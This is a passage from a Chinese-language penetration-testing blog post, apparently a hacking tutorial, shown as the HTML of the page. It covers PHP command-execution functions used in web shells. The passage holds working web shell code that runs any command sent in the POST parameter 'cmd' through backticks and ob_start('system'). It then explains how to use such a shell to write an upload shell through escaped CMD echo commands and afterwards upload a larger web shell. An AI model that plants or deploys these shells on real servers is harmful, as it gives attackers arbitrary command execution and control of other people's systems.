&quot;&lt;pre&gt;&quot;;</span><br><span class="line">            while(!feof($pipes[1]))</span><br><span class="line">            &#123;       </span><br><span class="line">                echo fgets($pipes[1],1024);</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    #pclose($handle);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &apos;GG&apos;;</span><br><span class="line">&#125;</span><br><span class="line">#&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<p>其他函数：<br>暂时就知道其他两个函数，不过也都是基于以上的函数所变化的。</p>
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$cmd=$_POST[&apos;cmd&apos;];</span><br><span class="line">echo &quot;&lt;pre&gt;&quot;;</span><br><span class="line"> </span><br><span class="line">//可执行并直接显示结果,反引号，波浪键。</span><br><span class="line">//shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体</span><br><span class="line">//所以如果把shell_exec()函数禁用了，反撇号 (`)也是执行不了命令的。</span><br><span class="line">echo `$cmd`;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">//注意，这个只显示结果的第一行，因此基本只能执行whoami</span><br><span class="line">//ob_start：打开缓冲区,需要system函数开启</span><br><span class="line">$a = &apos;system&apos;;</span><br><span class="line">ob_start($a);</span><br><span class="line">echo &quot;$_POST[cmd]&quot;;</span><br><span class="line">ob_end_flush();</span><br><span class="line"> </span><br><span class="line">echo &quot;&lt;/pre&gt;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p><a href="javascript:void(0);" target="_blank" rel="noopener"><img src="https://common.cnblogs.com/images/copycode.gif" alt="复制代码"></a></p>
+<p>上面讲完命令执行命令，也都可以执行命令了，那么如何利用这些命令马来进一步上传我们的大马呢，这里就要涉及到一下CMD命令了，有兴趣的同学可以去参考链接查看《CMD命令特殊符号》的文章。</p>
+<p>​     这里了我是用echo写文件的思路，遗忘大佬教的用msf结合命令行去下载大马我暂时还没去实践，就留着以后有时间再写了，废话不多说，开干吧！</p>
+<p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506132934297-1853048567.png" alt="img"></p>
+<p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506132944801-681034947.png" alt="img"></p>
+<p>然后用【echo】命令写入我们的上传马</p>
+<p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506132954499-1249643553.png" alt="img"></p>
+<p>☆☆☆这里注意【&lt;】【&gt;】【&amp;】这三个字符在CMD命令行中有特殊意义，需要在前面加【^】进行转义，可以用文本的替换来实现这个功能。</p>
+<p><img src="https://img2018.cnblogs.com/blog/1545399/201905/1545399-20190506133052527-299482910.png" alt="img"></p>
+<p>写入成功之后就可以上传我们的大马啦 ^-^！</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/10/24/sql注入之参数污染绕waf/" rel="next" title="sql注入之参数污染绕waf">
+                <i class="fa fa-chevron-left"></i> sql注入之参数污染绕waf
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">VegyChick</p>
+              <div class="site-description motion-element" itemprop="description">沉迷渗透测试的信安菜鸟</div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">21</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#1、eval-函数"><span class="nav-number">1.</span> <span class="nav-text">1、eval()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2、assert-函数"><span class="nav-number">2.</span> <span class="nav-text">2、assert()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3、preg-replace"><span class="nav-number">3.</span> <span class="nav-text">3、preg_replace()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4、create-function-函数"><span class="nav-number">4.</span> <span class="nav-text">4、create_function()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5、array-map-函数"><span class="nav-number">5.</span> <span class="nav-text">5、array_map()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6、call-user-func-函数"><span class="nav-number">6.</span> <span class="nav-text">6、call_user_func()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7、call-user-func-array-函数"><span class="nav-number">7.</span> <span class="nav-text">7、call_user_func_array()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#8、array-filter-函数"><span class="nav-number">8.</span> <span class="nav-text">8、array_filter()函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#9、uasort-函数"><span class="nav-number">9.</span> <span class="nav-text">9、uasort()函数</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#二、命令执行函数"><span class="nav-number"></span> <span class="nav-text">二、命令执行函数</span></a></li></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">VegyChick</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v7.2.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/schemes/muse.js?v=7.2.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+
+  
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
